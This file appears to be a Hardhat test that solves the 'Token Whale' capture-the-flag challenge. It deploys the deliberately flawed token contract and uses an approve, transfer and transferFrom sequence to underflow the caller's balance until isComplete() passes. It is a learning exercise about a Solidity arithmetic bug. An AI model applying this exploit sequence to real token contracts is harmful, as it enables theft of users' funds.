import { expect } from "chai";
import { ethers } from "hardhat";

describe("TokenWhaleChallenge", () => {
  it("Solves the challenge", async () => {
    const [user1, user2] = await ethers.getSigners();

    const user1Address = await user1.getAddress();
    const challengeFactory = await ethers.getContractFactory("TokenWhaleChallenge");
    const challengeContract = await challengeFactory.deploy(user1Address);
    await challengeContract.deployed();

    const approveTx = await challengeContract.connect(user2).approve(user1.address, 1000);
    await approveTx.wait();

    const transferTx = await challengeContract.connect(user1).transfer(user2.address, 501);
    await transferTx.wait();

    const transferFromTx = await challengeContract
      .connect(user1)
      .transferFrom(user2.address, "0x0000000000000000000000000000000000000000", 500);
    await transferFromTx.wait();

    expect(await challengeContract.isComplete()).to.be.true;
  });
});
